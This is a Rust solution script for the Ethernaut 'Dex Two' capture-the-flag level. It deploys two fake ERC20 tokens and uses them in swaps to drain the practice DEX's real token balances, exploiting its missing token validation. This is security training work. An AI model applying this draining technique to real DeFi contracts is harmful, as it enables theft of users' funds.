use async_trait::async_trait;
use ctf::ethernaut::lvl23_dex_two::*;
use ethers::types::U256;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = DexTwo::new(target.address, offender.clone());
        let token1 =
            SwappableTokenTwo::new(contract.token_1().await?, offender.clone());
        let token2 =
            SwappableTokenTwo::new(contract.token_2().await?, offender.clone());

        println!("token1: {:?}", token1.balance_of(offender.address()).await?);
        println!("token2: {:?}", token2.balance_of(offender.address()).await?);

        let fake1 = SwappableTokenTwo::deploy(
            offender.to_owned(),
            (
                contract.address(),
                String::from("Fake 1"),
                String::from("FCK1"),
                U256::from(100),
            ),
        )?
        .send()
        .await?;

        let fake2 = SwappableTokenTwo::deploy(
            offender.to_owned(),
            (
                contract.address(),
                String::from("Fake 2"),
                String::from("FCK2"),
                U256::from(100),
            ),
        )?
        .send()
        .await?;

        contract
            .approve(contract.address(), U256::from(1000))
            .send()
            .await?
            .await?;

        fake1
            .approve_with_owner_and_spender(
                offender.address(),
                contract.address(),
                U256::from(1000),
            )
            .send()
            .await?;
        fake2
            .approve_with_owner_and_spender(
                offender.address(),
                contract.address(),
                U256::from(1000),
            )
            .send()
            .await?;
        fake1.transfer(contract.address(), U256::from(1)).send().await?.await?;
        fake2.transfer(contract.address(), U256::from(1)).send().await?.await?;

        println!("fake1: {:?}", fake1.balance_of(offender.address()).await?);
        println!("fake2: {:?}", fake2.balance_of(offender.address()).await?);

        contract
            .swap(fake1.address(), token1.address(), U256::from(1))
            .send()
            .await?;
        contract
            .swap(fake2.address(), token2.address(), U256::from(1))
            .send()
            .await?;
        Ok(())
    }
}
